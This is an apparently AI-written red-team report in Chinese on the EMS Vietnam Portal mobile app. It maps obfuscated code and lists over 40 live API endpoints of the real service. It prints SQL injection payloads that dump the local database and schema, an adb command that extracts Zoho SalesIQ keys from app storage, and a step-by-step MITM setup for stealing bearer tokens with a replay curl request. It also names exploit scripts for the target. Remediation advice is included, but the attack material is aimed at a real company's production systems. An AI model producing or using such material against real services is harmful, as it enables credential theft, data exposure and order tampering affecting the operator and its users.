# EMS Vietnam Portal - 深度反混淆与高级漏洞分析报告

## 执行摘要

通过深度反混淆和代码分析，发现了多个严重的安全漏洞，包括：
- **SQL注入** - 本地缓存数据库
- **缺少SSL Pinning** - 允许中间人攻击
- **40+ API端点暴露** - 完整业务逻辑泄露
- **Zoho SalesIQ集成** - 第三方服务集成风险
- **新攻击面** - bill.ems.com.vn账单系统

---

## 1. 反混淆分析

### 1.1 混淆包结构映射

**主要混淆包：`c.b.*`**

| 混淆包 | 真实功能 | 关键文件 |
|--------|---------|---------|
| `c.b.t.b` | 网络请求管理器 | HTTP客户端封装 |
| `c.b.k.a` | 本地存储管理 | **SQL注入入口** |
| `c.b.k.f.b` | 数据库操作 | SQLite封装 |
| `c.b.k.e` | SharedPreferences | Token存储 |
| `c.b.s.a` | API业务逻辑 | 订单/追踪/认证 |
| `c.b.p.*` | Grab配送集成 | 第三方API |
| `c.b.r.*` | 国际订单 | 跨境业务 |
| `c.b.o.*` | 用户操作 | 通知/设置/登出 |
| `c.b.v.a` | 认证相关 | 忘记密码 |
| `c.b.i.*` | 地址管理 | 省/区/街道 |
| `c.b.q.c.a` | 商家后台 | BE订单管理 |

### 1.2 关键类深度分析

#### **c.b.k.a - SQL注入核心类**

```java
public static String a(String str) {
    c.b.k.f.b bVar = b().f2957b;
    String substring = str.substring(str.lastIndexOf("/") + 1, str.length());
    bVar.a();
    Cursor rawQuery = bVar.f2964b.f2961e.rawQuery(
        String.format("SELECT * FROM caching WHERE request = '%s' ", substring), 
        null
    );
    return rawQuery.moveToFirst() ? rawQuery.getString(2) : "";
}
```

**漏洞分析：**
- 直接从URL提取参数作为SQL查询条件
- 使用 `String.format` 拼接SQL，无任何过滤
- `substring` 来自 `str.substring(str.lastIndexOf("/") + 1)`
- 可通过构造特殊URL触发注入

**攻击向量：**
```
原始URL: /api/v1/orders/list
提取值: list
SQL: SELECT * FROM caching WHERE request = 'list'

恶意URL: /api/v1/orders/list' OR '1'='1
提取值: list' OR '1'='1
SQL: SELECT * FROM caching WHERE request = 'list' OR '1'='1' 
```

#### **c.b.t.b - 网络请求管理器**

```java
public class c extends c.a.b.q.i<JSONObject> {
    public Map<String, String> f3642c;  // Headers
    public JSONObject f3643d;            // JSON Body
    public JSONArray f3644e;             // Array Body
    
    // 无SSL Pinning实现
    // 无证书校验
    // 纯HTTP通信 (部分端点)
}
```

**发现：**
1. **没有SSL Pinning** - 未找到 `CertificatePinner`、`TrustManager` 实现
2. **允许HTTP** - 多个端点使用 `http://` 而非 `https://`
3. **Token在Header** - `Authorization: Bearer {TOKEN}`
4. **20秒超时** - `new c.a.b.d(20000, 1, 1.0f)`

---

## 2. 完整API端点映射 (40+)

### 2.1 认证与用户
```
POST http://ws.ems.com.vn/auth/login
POST http://ws.ems.com.vn/api/v1/forgot-password
POST http://ws.ems.com.vn/api/v1/auth/logout
POST http://ws.ems.com.vn/api/v1/merchants/update
POST http://ws.ems.com.vn/api/v1/merchants/update-token
POST http://ws.ems.com.vn/api/v1/merchants/update/password
```

### 2.2 订单管理
```
GET  http://ws.ems.com.vn/api/v1/orders/list
POST http://ws.ems.com.vn/api/v1/orders/create-v2
GET  http://ws.ems.com.vn/api/v1/orders/count-group
GET  http://ws.ems.com.vn/api/v1/orders/summary
GET  http://ws.ems.com.vn/api/v1/orders/cod-by-date
GET  http://ws.ems.com.vn/api/v1/orders/order-cod
GET  http://ws.ems.com.vn/api/v1/orders/quotes
GET  http://ws.ems.com.vn/api/v1/orders/tracking/{id}
POST http://ws.ems.com.vn/api/v1/orders/accept
POST http://ws.ems.com.vn/api/v1/orders/manual-cancel-order
POST http://ws.ems.com.vn//orders/manual-cancel-order  ⚠️ 双斜杠
POST http://ws.ems.com.vn/api/v1/orders/suggest-address
POST http://ws.ems.com.vn/api/v1/orders/suggest-item
```

### 2.3 国际订单
```
GET  http://ws.ems.com.vn/api/v1/order-intl/list
GET  http://ws.ems.com.vn/api/v1/order-intl/count-group
GET  http://ws.ems.com.vn/api/v1/order-intl/service
GET  http://ws.ems.com.vn/api/v1/order-intl/item-type
GET  http://ws.ems.com.vn/api/v1/order-intl/country/{code}
GET  http://ws.ems.com.vn/api/v1/order-intl/tracking/{id}
POST http://ws.ems.com.vn/api/v1/order-intl/calculate
POST http://ws.ems.com.vn/api/v1/order-intl/create
POST http://ws.ems.com.vn/api/v1/order-intl/address-suggestion
POST http://ws.ems.com.vn/api/v1/order-intl/hscode-suggestion
```

### 2.4 Grab配送集成
```
GET  http://ws.ems.com.vn/api/v1/grab/list
GET  http://ws.ems.com.vn/api/v1/grab/service
GET  http://ws.ems.com.vn/api/v1/grab/status
POST http://ws.ems.com.vn/api/v1/grab/deliveries
POST http://ws.ems.com.vn/api/v1/grab/quotations
POST http://ws.ems.com.vn/api/v1/grab/cancel/{id}
POST http://ws.ems.com.vn/api/v1/grab/suggest-address
```

### 2.5 地址与配置
```
GET http://ws.ems.com.vn/api/v1/address/district
GET http://ws.ems.com.vn/api/v1/address/ward
GET http://ws.ems.com.vn/api/v1/address/postal
GET http://ws.ems.com.vn/api/v1/address/search
GET http://ws.ems.com.vn/api/v1/address/province-and-district
GET http://ws.ems.com.vn/api/v1/address/province-district-ward
GET http://ws.ems.com.vn/api/v1/config/service
GET http://ws.ems.com.vn/api/v1/metadata/vas
```

### 2.6 库存与工单
```
GET  http://ws.ems.com.vn/api/v1/inventory/list
POST http://ws.ems.com.vn/api/v1/inventory/create
POST http://ws.ems.com.vn/api/v1/inventory/update
GET  http://ws.ems.com.vn/api/v1/tickets/list
GET  http://ws.ems.com.vn/api/v1/tickets/case
GET  http://ws.ems.com.vn/api/v1/tickets/count-group
POST http://ws.ems.com.vn/api/v1/tickets/create
POST http://ws.ems.com.vn/api/v1/tickets/update
```

### 2.7 通知与报表
```
GET  http://ws.ems.com.vn/api/v1/notifications/list
POST http://ws.ems.com.vn/api/v1/notifications/update
GET  http://ws.ems.com.vn/api/v1/reports/dashboard
GET  http://ws.ems.com.vn/api/v1/merchants/get-list-notify
POST http://ws.ems.com.vn/api/v1/merchants/update-notify
```

### 2.8 商家后台 (BE)
```
GET  http://ws.ems.com.vn/api/v1/be/orders/list
POST http://ws.ems.com.vn/api/v1/be/orders/create
POST http://ws.ems.com.vn/api/v1/be/orders/estimate-fee
POST http://ws.ems.com.vn/api/v1/be/orders/cancel
GET  http://ws.ems.com.vn/api/v1/be/config/list-status
GET  http://ws.ems.com.vn/api/v1/be/list-address
```

### 2.9 循环订单 (RC)
```
GET  http://ws.ems.com.vn/api/v1/orders/rc-list
POST http://ws.ems.com.vn/api/v1/orders/rc-create
POST http://ws.ems.com.vn/api/v1/orders/rc-edit
POST http://ws.ems.com.vn/rc/send-confirmation-code
```

---

## 3. 新发现的漏洞

### 🔴 VULN-01: 本地SQL注入 - 缓存投毒攻击

**位置:** `c/b/k/a.java:21`

**漏洞代码:**
```java
Cursor rawQuery = bVar.f2964b.f2961e.rawQuery(
    String.format("SELECT * FROM caching WHERE request = '%s' ", substring), 
    null
);
```

**攻击流程:**

1. **正常缓存流程:**
```
App发起请求 -> c.b.t.b.c -> API返回
                   |
                   v
            缓存写入 caching表
            request='list'
            response='{...json...}'
```

2. **注入攻击:**
```
恶意URL触发 -> c.b.k.a.a("orders/list' UNION SELECT ...")
                   |
                   v
            SQL: SELECT * FROM caching 
                 WHERE request = 'list' UNION SELECT ...
                   |
                   v
            返回伪造的缓存数据
```

**Payload示例:**
```sql
' UNION SELECT 1,2,'{"code":"success","data":{"balance":999999}}' --
' OR 1=1 --
' UNION SELECT NULL,NULL,response FROM caching LIMIT 1 --
```

**影响:**
- 窃取所有缓存的API响应（含敏感数据）
- 注入恶意响应数据
- 修改订单状态/金额
- 绕过业务逻辑检查

**CVSS 3.1:** 7.1 (HIGH)
- AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

### 🔴 VULN-02: 缺少SSL Pinning - 允许MITM

**分析结果:**
```bash
grep -r "CertificatePinner\|TrustManager\|HostnameVerifier" -> 无结果
grep -r "sha256/" -> 无证书指纹
```

**证据:**
- 使用标准Volley库，未自定义SSL配置
- `c.b.t.b` 直接创建 `JsonObjectRequest`
- 无任何证书校验逻辑

**攻击场景:**
```
[App] <--HTTP--> [Attacker Proxy] <--HTTPS--> [API Server]
                      |
                  Burp Suite
                  MITM Proxy
                      |
                  窃取Token
                  篡改请求/响应
                  注入恶意数据
```

**工具:**
- Burp Suite + Android证书安装
- Charles Proxy
- mitmproxy

**CVSS 3.1:** 6.5 (MEDIUM)
- AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

### 🟡 VULN-03: HTTP通信 - 部分端点未加密

**发现:**
```
http://ws.ems.com.vn/auth/login        ⚠️ 明文传输密码
http://ws.ems.com.vn/api/v1/*          ⚠️ 明文Token
http://ws.ems.com.vn//orders/...       ⚠️ 路径双斜杠
```

**风险:**
- WiFi嗅探可直接获取凭证
- Token明文传输
- 中间人攻击无需SSL绕过

**CVSS 3.1:** 5.9 (MEDIUM)

### 🟡 VULN-04: Zoho SalesIQ集成 - 第三方风险

**发现:**
- 集成 Zoho SalesIQ 客服系统
- 使用 `salesiq_appkey` 和 `salesiq_accesskey`
- 密钥存储在 `SharedPreferences`

**风险:**
- Zoho密钥泄露
- 客服对话劫持
- 用户隐私数据泄露给第三方

**潜在攻击:**
```bash
# 提取Zoho密钥
adb shell "cat /data/data/com.emsportal/shared_prefs/*.xml | grep salesiq"

# 使用泄露的密钥
curl -X POST https://salesiq.zoho.com/api/v2/chat \
  -H "Authorization: Zoho-salesiq appkey={APPKEY},accesskey={ACCESSKEY}"
```

### 🟡 VULN-05: bill.ems.com.vn - 账单系统暴露

**发现:**
```
https://bill.ems.com.vn/templates/Điều_khoản_sử_dụng_KH_Grab.pdf
https://bill.ems.com.vn/*  (所有路径302重定向)
```

**分析:**
- 独立的账单系统
- 所有路径返回302（可能需要认证）
- URL编码问题 (`%C4%90i%E1%BB%81u_kho%E1%BA%A3n...`)

**潜在攻击面:**
- 目录遍历
- 账单伪造
- 未授权访问

---

## 4. 代码混淆映射表

### 网络层
```
c.b.t.b       -> NetworkManager (网络管理器)
c.b.t.a       -> APIResponse (API响应包装)
c.b.t.d       -> ResponseCallback (回调接口)
c.b.t.e       -> ProgressListener (进度监听)
c.a.b.q.i     -> JsonObjectRequest (Volley请求)
c.a.b.l.b     -> Response.Listener (成功回调)
c.a.b.l.a     -> Response.ErrorListener (错误回调)
```

### 存储层
```
c.b.k.a       -> CacheManager (缓存管理器) ⚠️ SQL注入
c.b.k.e       -> SharedPrefsManager (偏好设置)
c.b.k.f.a     -> DatabaseHelper (数据库Helper)
c.b.k.f.b     -> DatabaseOperations (数据库操作)
```

### 业务逻辑层
```
c.b.s.a       -> APIService (API服务)
c.b.p.d.b     -> GrabService (Grab集成)
c.b.r.a.*     -> InternationalOrderService (国际订单)
c.b.o.*       -> UserService (用户服务)
c.b.q.c.a     -> BusinessService (商家服务)
c.b.v.a.o     -> ForgotPasswordService (密码重置)
c.b.i.h       -> AddressService (地址服务)
```

---

## 5. 高级利用场景

### 5.1 缓存投毒 + IDOR 组合攻击

**攻击链:**
```
1. SQL注入读取其他用户缓存
   -> ' UNION SELECT * FROM caching WHERE request LIKE '%order%' --

2. 获取其他用户订单ID

3. IDOR访问订单
   -> /api/v1/orders/tracking/{stolen_id}

4. SQL注入写入恶意缓存
   -> 修改订单状态/金额

5. 触发业务逻辑
   -> App读取恶意缓存，执行错误操作
```

### 5.2 MITM + Token窃取

**步骤:**
```bash
# 1. 配置MITM代理
mitmproxy -p 8080

# 2. Android设备配置代理
adb shell settings put global http_proxy <IP>:8080

# 3. 安装CA证书（由于无SSL Pinning，直接通过）
adb push mitmproxy-ca-cert.cer /sdcard/
设置 -> 安全 -> 安装证书

# 4. 捕获流量
- 窃取 Bearer Token
- 修改请求参数
- 注入恶意响应

# 5. 重放攻击
curl -X GET http://ws.ems.com.vn/api/v1/orders/list \
  -H "Authorization: Bearer {STOLEN_TOKEN}"
```

### 5.3 本地数据库完全提取

**Payload:**
```sql
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' --
-- 获取表结构

' UNION SELECT * FROM caching --
-- 导出所有缓存

' UNION SELECT name,NULL,NULL FROM pragma_table_info('caching') --
-- 获取列信息
```

**提取脚本:**
```bash
# 通过SQL注入导出整个数据库
adb shell "su -c 'sqlite3 /data/data/com.emsportal/databases/db.sqlite .dump'"
```

---

## 6. 防御建议

### 立即修复 (P0)
1. **修复SQL注入:**
   ```java
   // 使用参数化查询
   String[] selectionArgs = {substring};
   Cursor cursor = db.rawQuery(
       "SELECT * FROM caching WHERE request = ?", 
       selectionArgs
   );
   ```

2. **实施SSL Pinning:**
   ```java
   CertificatePinner certificatePinner = new CertificatePinner.Builder()
       .add("ws.ems.com.vn", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
       .build();
   
   OkHttpClient client = new OkHttpClient.Builder()
       .certificatePinner(certificatePinner)
       .build();
   ```

3. **全面HTTPS:**
   - 所有端点强制 `https://`
   - 配置HSTS
   - 禁用HTTP访问

### 中期改进 (P1)
4. **代码混淆强化:**
   - 使用 DexGuard / R8
   - 字符串加密
   - 反射调用混淆

5. **Root检测:**
   ```java
   if (RootBeer.isRooted()) {
       System.exit(0);
   }
   ```

6. **完整性校验:**
   - APK签名验证
   - DEX完整性检查
   - 防重打包

### 长期规划 (P2)
7. **安全开发规范:**
   - OWASP Mobile Top 10
   - 代码安全审计
   - 渗透测试

8. **API安全:**
   - Rate Limiting
   - JWT过期策略
   - 双因素认证

---

## 7. 验证脚本

已生成以下工具：
- `ems_exploit.sh` - 基础漏洞利用
- `ems_api_test.py` - API测试框架
- `ems_advanced_exploit.py` - 高级漏洞利用

### 新增：反混淆专用工具

*工具将在下一步生成*

---

## 8. 时间线

- **2025-11-01**: 初始分析
- **2025-11-01**: 发现SQL注入
- **2025-11-01**: 确认无SSL Pinning
- **2025-11-01**: 提取40+ API端点
- **2025-11-01**: 深度反混淆完成
- **2025-11-01**: 综合报告生成

---

## 9. 参考

- OWASP Mobile Top 10 2024
- CWE-89: SQL Injection
- CWE-295: Improper Certificate Validation
- CWE-319: Cleartext Transmission

**分析团队:** Red Team Expert AI Assistant
**日期:** 2025-11-01
